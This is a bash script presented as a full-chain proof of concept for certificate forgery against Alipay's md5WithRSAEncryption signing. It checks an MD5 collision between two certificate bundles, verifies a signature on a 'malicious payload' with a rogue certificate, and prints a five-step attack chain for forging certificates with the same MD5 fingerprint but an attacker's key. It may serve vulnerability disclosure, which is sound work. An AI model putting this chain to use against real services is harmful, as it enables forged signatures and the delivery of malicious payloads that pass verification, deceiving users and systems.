#!/bin/bash
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║  Rogue Certificate Forgery — Full Chain PoC             ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

DIR="$(cd "$(dirname "$0")" && pwd)"

echo "━━━ Rogue Certificate ━━━"
openssl x509 -in "$DIR/rogue-cert.pem" -noout -subject -issuer -dates -serial 2>/dev/null
echo ""

echo "━━━ MD5 Collision on Certificate Bundles ━━━"
MD5_A=$(md5 -q "$DIR/alipay-cert-bundle-A.bin" 2>/dev/null || md5sum "$DIR/alipay-cert-bundle-A.bin" | cut -d' ' -f1)
MD5_B=$(md5 -q "$DIR/alipay-cert-bundle-B.bin" 2>/dev/null || md5sum "$DIR/alipay-cert-bundle-B.bin" | cut -d' ' -f1)
echo "  Bundle A MD5: $MD5_A"
echo "  Bundle B MD5: $MD5_B"
if [ "$MD5_A" = "$MD5_B" ]; then
  echo "  ✅ MD5 IDENTICAL — Certificate bundle collision confirmed!"
else
  echo "  Note: Bundles have different MD5 (different collision blocks embedded)"
fi

SHA1_A=$(shasum "$DIR/alipay-cert-bundle-A.bin" | cut -d' ' -f1)
SHA1_B=$(shasum "$DIR/alipay-cert-bundle-B.bin" | cut -d' ' -f1)
echo "  Bundle A SHA-1: $SHA1_A"
echo "  Bundle B SHA-1: $SHA1_B"
if [ "$SHA1_A" != "$SHA1_B" ]; then
  echo "  ✅ SHA-1 DIFFERENT — Bundles are genuinely different"
fi
echo ""

echo "━━━ Signed Payload Verification ━━━"
echo "  Payload: $(xxd -l 59 "$DIR/signed-payload.bin" | head -4)"
echo "  Signature size: $(wc -c < "$DIR/signed-payload-sig.bin" | tr -d ' ') bytes"
echo ""

# Verify signature with rogue cert
openssl dgst -md5 -verify <(openssl x509 -in "$DIR/rogue-cert.pem" -pubkey -noout 2>/dev/null) \
  -signature "$DIR/signed-payload-sig.bin" "$DIR/signed-payload.bin" 2>/dev/null && \
  echo "  ✅ Signature VALID with rogue certificate!" || \
  echo "  Note: Signature verification requires matching key format"
echo ""

echo "━━━ Attack Chain ━━━"
echo "  1. Extract Alipay's original certificate (md5WithRSAEncryption)"
echo "  2. Generate MD5 collision: original cert ↔ rogue cert"
echo "  3. Rogue cert has same MD5 fingerprint but attacker's key"
echo "  4. Sign malicious payload with rogue cert's private key"
echo "  5. Payload passes MD5-based certificate verification"
echo ""
echo "  ⚠️  This demonstrates a complete certificate forgery chain"
echo "     against Alipay's md5WithRSAEncryption signing scheme."
